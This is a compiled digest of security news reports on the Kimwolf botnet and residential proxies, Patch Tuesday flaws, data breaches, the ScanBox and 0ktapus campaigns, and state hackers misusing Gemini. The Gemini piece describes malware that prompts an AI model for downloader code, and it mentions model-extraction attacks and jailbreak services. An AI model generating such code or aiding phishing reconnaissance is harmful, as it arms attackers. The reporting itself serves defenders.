“To be clear, this suggests that nearly 25% of customers had at least one device that was an endpoint in a residential proxy service targeted by Kimwolf operators,” Infoblox explained. “Such a device, maybe a phone or a laptop, was essentially co-opted by the threat actor to probe the local network for vulnerable devices. A query means a scan was made, not that new devices were compromised. Lateral movement would fail if there were no vulnerable devices to be found or if the DNS resolution was blocked.”

Synthient, a startup that tracks proxy services and was the first to disclose on January 2 the unique methods Kimwolf uses to spread, found proxy endpoints from IPIDEA were present in alarming numbers at government and academic institutions worldwide. Synthient said it spied at least 33,000 affected Internet addresses at universities and colleges, and nearly 8,000 IPIDEA proxies within various U.S. and foreign government networks.

The top 50 domain names sought out by users of IPIDEA’s residential proxy service, according to Synthient.

In a webinar on January 16, experts at the proxy tracking service Spur profiled Internet addresses associated with IPIDEA and 10 other proxy services that were thought to be vulnerable to Kimwolf’s tricks. Spur found residential proxies in nearly 300 government owned and operated networks, 318 utility companies, 166 healthcare companies or hospitals, and 141 companies in banking and finance.

“I looked at the 298 [government] owned and operated [networks], and so many of them were DoD [U.S. Department of Defense], which is kind of terrifying that DoD has IPIDEA and these other proxy services located inside of it,” Spur Co-Founder Riley Kilmer said. “I don’t know how these enterprises have these networks set up. It could be that [infected devices] are segregated on the network, that even if you had local access it doesn’t really mean much. However, it’s something to be aware of. If a device goes in, anything that device has access to the proxy would have access to.”

Kilmer said Kimwolf demonstrates how a single residential proxy infection can quickly lead to bigger problems for organizations that are harboring unsecured devices behind their firewalls, noting that proxy services present a potentially simple way for attackers to probe other devices on the local network of a targeted organization.

“If you know you have [proxy] infections that are located in a company, you can chose that [network] to come out of and then locally pivot,” Kilmer said. “If you have an idea of where to start or look, now you have a foothold in a company or an enterprise based on just that.”

This is the third story in our series on the Kimwolf botnet. Next week, we’ll shed light on the myriad China-based individuals and companies connected to the Badbox 2.0 botnet, the collective name given to a vast number of Android TV streaming box models that ship with no discernible security or authentication built-in, and with residential proxy malware pre-installed.

[8] Krebs on Security - Patch Tuesday, January 2026 Edition
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 14 Jan 2026 00:47:38 +0000
Link: https://krebsonsecurity.com/2026/01/patch-tuesday-january-2026-edition/

[TAM METİN - 910 kelime]
Microsoft today issued patches to plug at least 113 security holes in its various Windows operating systems and supported software. Eight of the vulnerabilities earned Microsoft’s most-dire “critical” rating, and the company warns that attackers are already exploiting one of the bugs fixed today.

January’s Microsoft zero-day flaw — CVE-2026-20805 — is brought to us by a flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Kev Breen, senior director of cyber threat research at Immersive, said despite awarding CVE-2026-20805 a middling CVSS score of 5.5, Microsoft has confirmed its active exploitation in the wild, indicating that threat actors are already leveraging this flaw against organizations.

Breen said vulnerabilities of this kind are commonly used to undermine Address Space Layout Randomization (ASLR), a core operating system security control designed to protect against buffer overflows and other memory-manipulation exploits.

“By revealing where code resides in memory, this vulnerability can be chained with a separate code execution flaw, transforming a complex and unreliable exploit into a practical and repeatable attack,” Breen said. “Microsoft has not disclosed which additional components may be involved in such an exploit chain, significantly limiting defenders’ ability to proactively threat hunt for related activity. As a result, rapid patching currently remains the only effective mitigation.”

Chris Goettl, vice president of product management at Ivanti, observed that CVE-2026-20805 affects all currently supported and extended security update supported versions of the Windows OS. Goettl said it would be a mistake to dismiss the severity of this flaw based on its “Important” rating and relatively low CVSS score.

“A risk-based prioritization methodology warrants treating this vulnerability as a higher severity than the vendor rating or CVSS score assigned,” he said.

Among the critical flaws patched this month are two Microsoft Office remote code execution bugs (CVE-2026-20952 and CVE-2026-20953) that can be triggered just by viewing a booby-trapped message in the Preview Pane.

Our October 2025 Patch Tuesday “End of 10” roundup noted that Microsoft had removed a modem driver from all versions after it was discovered that hackers were abusing a vulnerability in it to hack into systems. Adam Barnett at Rapid7 said Microsoft today removed another couple of modem drivers from Windows for a broadly similar reason: Microsoft is aware of functional exploit code for an elevation of privilege vulnerability in a very similar modem driver, tracked as CVE-2023-31096.

“That’s not a typo; this vulnerability was originally published via MITRE over two years ago, along with a credible public writeup by the original researcher,” Barnett said. “Today’s Windows patches remove agrsm64.sys and agrsm.sys. All three modem drivers were originally developed by the same now-defunct third party, and have been included in Windows for decades. These driver removals will pass unnoticed for most people, but you might find active modems still in a few contexts, including some industrial control systems.”

According to Barnett, two questions remain: How many more legacy modem drivers are still present on a fully-patched Windows asset; and how many more elevation-to-SYSTEM vulnerabilities will emerge from them before Microsoft cuts off attackers who have been enjoying “living off the land[line] by exploiting an entire class of dusty old device drivers?”

“Although Microsoft doesn’t claim evidence of exploitation for CVE-2023-31096, the relevant 2023 write-up and the 2025 removal of the other Agere modem driver have provided two strong signals for anyone looking for Windows exploits in the meantime,” Barnett said. “In case you were wondering, there is no need to have a modem connected; the mere presence of the driver is enough to render an asset vulnerable.”

Immersive, Ivanti and Rapid7 all called attention to CVE-2026-21265, which is a critical Security Feature Bypass vulnerability affecting Windows Secure Boot. This security feature is designed to protect against threats like rootkits and bootkits, and it relies on a set of certificates that are set to expire in June 2026 and October 2026. Once these 2011 certificates expire, Windows devices that do not have the new 2023 certificates can no longer receive Secure Boot security fixes.

Barnett cautioned that when updating the bootloader and BIOS, it is essential to prepare fully ahead of time for the specific OS and BIOS combination you’re working with, since incorrect remediation steps can lead to an unbootable system.

“Fifteen years is a very long time indeed in information security, but the clock is running out on the Microsoft root certificates which have been signing essentially everything in the Secure Boot ecosystem since the days of Stuxnet,” Barnett said. “Microsoft issued replacement certificates back in 2023, alongside CVE-2023-24932 which covered relevant Windows patches as well as subsequent steps to remediate the Secure Boot bypass exploited by the BlackLotus bootkit.”

Goettl noted that Mozilla has released updates for Firefox and Firefox ESR resolving a total of 34 vulnerabilities, two of which are suspected to be exploited (CVE-2026-0891 and CVE-2026-0892). Both are resolved in Firefox 147 (MFSA2026-01) and CVE-2026-0891 is resolved in Firefox ESR 140.7 (MFSA2026-03).

“Expect Google Chrome and Microsoft Edge updates this week in addition to a high severity vulnerability in Chrome WebView that was resolved in the January 6 Chrome update (CVE-2026-0628),” Goettl said.

As ever, the SANS Internet Storm Center has a per-patch breakdown by severity and urgency. Windows admins should keep an eye on askwoody.com for any news about patches that don’t quite play nice with everything. If you experience any issues related installing January’s patches, please drop a line in the comments below.

[9] Krebs on Security - Who Benefited from the Aisuru and Kimwolf Botnets?
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 08 Jan 2026 23:23:43 +0000
Link: https://krebsonsecurity.com/2026/01/who-benefited-from-the-aisuru-and-kimwolf-botnets/

[TAM METİN - 1877 kelime]
Our first story of 2026 revealed how a destructive new botnet called Kimwolf has infected more than two million devices by mass-compromising a vast number of unofficial Android TV streaming boxes. Today, we’ll dig through digital clues left behind by the hackers, network operators and services that appear to have benefitted from Kimwolf’s spread.

On Dec. 17, 2025, the Chinese security firm XLab published a deep dive on Kimwolf, which forces infected devices to participate in distributed denial-of-service (DDoS) attacks and to relay abusive and malicious Internet traffic for so-called “residential proxy” services.

The software that turns one’s device into a residential proxy is often quietly bundled with mobile apps and games. Kimwolf specifically targeted residential proxy software that is factory installed on more than a thousand different models of unsanctioned Android TV streaming devices. Very quickly, the residential proxy’s Internet address starts funneling traffic that is linked to ad fraud, account takeover attempts and mass content scraping.

The XLab report explained its researchers found “definitive evidence” that the same cybercriminal actors and infrastructure were used to deploy both Kimwolf and the Aisuru botnet — an earlier version of Kimwolf that also enslaved devices for use in DDoS attacks and proxy services.

XLab said it suspected since October that Kimwolf and Aisuru had the same author(s) and operators, based in part on shared code changes over time. But it said those suspicions were confirmed on December 8 when it witnessed both botnet strains being distributed by the same Internet address at 93.95.112[.]59.

Public records show the Internet address range flagged by XLab is assigned to Lehi, Utah-based Resi Rack LLC. Resi Rack’s website bills the company as a “Premium Game Server Hosting Provider.” Meanwhile, Resi Rack’s ads on the Internet moneymaking forum BlackHatWorld refer to it as a “Premium Residential Proxy Hosting and Proxy Software Solutions Company.”

Resi Rack co-founder Cassidy Hales told KrebsOnSecurity his company received a notification on December 10 about Kimwolf using their network “that detailed what was being done by one of our customers leasing our servers.”

“When we received this email we took care of this issue immediately,” Hales wrote in response to an email requesting comment. “This is something we are very disappointed is now associated with our name and this was not the intention of our company whatsoever.”

The Resi Rack Internet address cited by XLab on December 8 came onto KrebsOnSecurity’s radar more than two weeks before that. Benjamin Brundage is founder of Synthient, a startup that tracks proxy services. In late October 2025, Brundage shared that the people selling various proxy services which benefitted from the Aisuru and Kimwolf botnets were doing so at a new Discord server called resi[.]to.

On November 24, 2025, a member of the resi-dot-to Discord channel shares an IP address responsible for proxying traffic over Android TV streaming boxes infected by the Kimwolf botnet.

When KrebsOnSecurity joined the resi[.]to Discord channel in late October as a silent lurker, the server had fewer than 150 members, including “Shox” — the nickname used by Resi Rack’s co-founder Mr. Hales — and his business partner “Linus,” who did not respond to requests for comment.

Other members of the resi[.]to Discord channel would periodically post new IP addresses that were responsible for proxying traffic over the Kimwolf botnet. As the screenshot from resi[.]to above shows, that Resi Rack Internet address flagged by XLab was used by Kimwolf to direct proxy traffic as far back as November 24, if not earlier. All told, Synthient said it tracked at least seven static Resi Rack IP addresses connected to Kimwolf proxy infrastructure between October and December 2025.

Neither of Resi Rack’s co-owners responded to follow-up questions. Both have been active in selling proxy services via Discord for nearly two years. According to a review of Discord messages indexed by the cyber intelligence firm Flashpoint, Shox and Linus spent much of 2024 selling static “ISP proxies” by routing various Internet address blocks at major U.S. Internet service providers.

In February 2025, AT&T announced that effective July 31, 2025, it would no longer originate routes for network blocks that are not owned and managed by AT&T (other major ISPs have since made similar moves). Less than a month later, Shox and Linus told customers they would soon cease offering static ISP proxies as a result of these policy changes.

Shox and Linux, talking about their decision to stop selling ISP proxies.

The stated owner of the resi[.]to Discord server went by the abbreviated username “D.” That initial appears to be short for the hacker handle “Dort,” a name that was invoked frequently throughout these Discord chats.

Dort’s profile on resi dot to.

This “Dort” nickname came up in KrebsOnSecurity’s recent conversations with “Forky,” a Brazilian man who acknowledged being involved in the marketing of the Aisuru botnet at its inception in late 2024. But Forky vehemently denied having anything to do with a series of massive and record-smashing DDoS attacks in the latter half of 2025 that were blamed on Aisuru, saying the botnet by that point had been taken over by rivals.

Forky asserts that Dort is a resident of Canada and one of at least two individuals currently in control of the Aisuru/Kimwolf botnet. The other individual Forky named as an Aisuru/Kimwolf botmaster goes by the nickname “Snow.”

On January 2 — just hours after our story on Kimwolf was published — the historical chat records on resi[.]to were erased without warning and replaced by a profanity-laced message for Synthient’s founder. Minutes after that, the entire server disappeared.

Later that same day, several of the more active members of the now-defunct resi[.]to Discord server moved to a Telegram channel where they posted Brundage’s personal information, and generally complained about being unable to find reliable “bulletproof” hosting for their botnet.

Hilariously, a user by the name “Richard Remington” briefly appeared in the group’s Telegram server to post a crude “Happy New Year” sketch that claims Dort and Snow are now in control of 3.5 million devices infected by Aisuru and/or Kimwolf. Richard Remington’s Telegram account has since been deleted, but it previously stated its owner operates a website that caters to DDoS-for-hire or “stresser” services seeking to test their firepower.

BYTECONNECT, PLAINPROXIES, AND 3XK TECH

Reports from both Synthient and XLab found that Kimwolf was used to deploy programs that turned infected systems into Internet traffic relays for multiple residential proxy services. Among those was a component that installed a software development kit (SDK) called ByteConnect, which is distributed by a provider known as Plainproxies.

ByteConnect says it specializes in “monetizing apps ethically and free,” while Plainproxies advertises the ability to provide content scraping companies with “unlimited” proxy pools. However, Synthient said that upon connecting to ByteConnect’s SDK they instead observed a mass influx of credential-stuffing attacks targeting email servers and popular online websites.

A search on LinkedIn finds the CEO of Plainproxies is Friedrich Kraft, whose resume says he is co-founder of ByteConnect Ltd. Public Internet routing records show Mr. Kraft also operates a hosting firm in Germany called 3XK Tech GmbH. Mr. Kraft did not respond to repeated requests for an interview.

In July 2025, Cloudflare reported that 3XK Tech (a.k.a. Drei-K-Tech) had become the Internet’s largest source of application-layer DDoS attacks. In November 2025, the security firm GreyNoise Intelligence found that Internet addresses on 3XK Tech were responsible for roughly three-quarters of the Internet scanning being done at the time for a newly discovered and critical vulnerability in security products made by Palo Alto Networks.

Source: Cloudflare’s Q2 2025 DDoS threat report.

LinkedIn has a profile for another Plainproxies employee, Julia Levi, who is listed as co-founder of ByteConnect. Ms. Levi did not respond to requests for comment. Her resume says she previously worked for two major proxy providers: Netnut Proxy Network, and Bright Data.

Synthient likewise said Plainproxies ignored their outreach, noting that the Byteconnect SDK continues to remain active on devices compromised by Kimwolf.

Synthient’s January 2 report said another proxy provider heavily involved in the sale of Kimwolf proxies was Maskify, which currently advertises on multiple cybercrime forums that it has more than six million residential Internet addresses for rent.

Maskify prices its service at a rate of 30 cents per gigabyte of data relayed through their proxies. According to Synthient, that price range is insanely low and is far cheaper than any other proxy provider in business today.

“Synthient’s Research Team received screenshots from other proxy providers showing key Kimwolf actors attempting to offload proxy bandwidth in exchange for upfront cash,” the Synthient report noted. “This approach likely helped fuel early development, with associated members spending earnings on infrastructure and outsourced development tasks. Please note that resellers know precisely what they are selling; proxies at these prices are not ethically sourced.”

Maskify did not respond to requests for comment.

Hours after our first Kimwolf story was published last week, the resi[.]to Discord server vanished, Synthient’s website was hit with a DDoS attack, and the Kimwolf botmasters took to doxing Brundage via their botnet.

The harassing messages appeared as text records uploaded to the Ethereum Name Service (ENS), a distributed system for supporting smart contracts deployed on the Ethereum blockchain. As documented by XLab, in mid-December the Kimwolf operators upgraded their infrastructure and began using ENS to better withstand the near-constant takedown efforts targeting the botnet’s control servers.

By telling infected systems to seek out the Kimwolf control servers via ENS, even if the servers that the botmasters use to control the botnet are taken down the attacker only needs to update the ENS text record to reflect the new Internet address of the control server, and the infected devices will immediately know where to look for further instructions.

“This channel itself relies on the decentralized nature of blockchain, unregulated by Ethereum or other blockchain operators, and cannot be blocked,” XLab wrote.

The text records included in Kimwolf’s ENS instructions can also feature short messages, such as those that carried Brundage’s personal information. Other ENS text records associated with Kimwolf offered some sage advice: “If flagged, we encourage the TV box to be destroyed.”

An ENS record tied to the Kimwolf botnet advises, “If flagged, we encourage the TV box to be destroyed.”

Both Synthient and XLabs say Kimwolf targets a vast number of Android TV streaming box models, all of which have zero security protections, and many of which ship with proxy malware built in. Generally speaking, if you can send a data packet to one of these devices you can also seize administrative control over it.

If you own a TV box that matches one of these model names and/or numbers, please just rip it out of your network. If you encounter one of these devices on the network of a family member or friend, send them a link to this story (or to our January 2 story on Kimwolf) and explain that it’s not worth the potential hassle and harm created by keeping them plugged in.

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 639 kelime]
Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.

Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.

Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.

“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “

Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.

In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.

In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.

Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.

Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.

Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.

“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.

[TAM METİN - 358 kelime]
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities (KEV) catalog.

The first flaw added to the catalog is a Microsoft Configuration Manager SQL Injection Vulnerability tracked as CVE-2024-43468. An unauthenticated attacker could send specially crafted requests to the system and trigger unsafe processing, allowing them to execute commands on the server or underlying database.

The second flaw added to the catalog is a Notepad++ Download of Code Without Integrity Check tracked as CVE-2025-15556. Vulnerability. Notepad++ versions before 8.8.9 using WinGUp have a flaw where updates aren’t verified. An attacker intercepting update traffic can make the updater run a malicious installer, allowing arbitrary code execution with the user’s privileges.

The third flaw added to the catalog is a security control bypass vulnerability, tracked as CVE-2025-40536, that could allow an unauthenticated attacker to access certain restricted functionality within Web Help Desk. While more limited in scope than the critical flaws, successful exploitation could still expose sensitive features and weaken the application’s overall security posture.

The last flaw added to the catalog is an Apple Multiple Buffer Overflow Vulnerability tracked as CVE-2026-20700.

This week, Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.

Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the vulnerabilities by March 5, 2026, except CVE-2025-40536, which must be solved by February 15, 2026.

[TAM METİN - 423 kelime]
Hackers broke into Dutch telecom firm Odido and accessed data from 6.2 million accounts. The company confirmed the breach and said attackers took names, addresses, phone numbers, email addresses, bank account details, dates of birth, and passport or ID numbers.

“Odido has been hit by a cyberattack, which compromised customer data. This involved personal data from a customer contact system used by Odido. No passwords, call logs, or billing information were affected.” reads a notice published by the company on its website. “The unauthorized access to the system was terminated as quickly as possible. Odido also engaged external cybersecurity experts to assist with implementing additional security measures as part of the incident response.”

The telco said the breach did not expose My Odido account passwords, call records, location data, invoice details, or scans of ID documents.

Odido’s subsidiary Ben also warned its customers that hackers may have stolen their information.

Odido is a Dutch telecommunications company and one of the largest mobile network operators in the Netherlands. It was formed when T-Mobile Netherlands and Tele2 were rebranded as Odido in 2023 after private equity firms Apax Partners and Warburg Pincus acquired the business.

Odido serves around 8 million mobile subscribers and about 1 million fixed broadband customers nationwide. The company provides mobile telephony, wireless broadband, and related services under multiple brands including Odido, Ben, and Simpel.

Financially, Odido generates around €2 billion in annual revenue, with growth in consumer broadband and business mobile services contributing to its topline

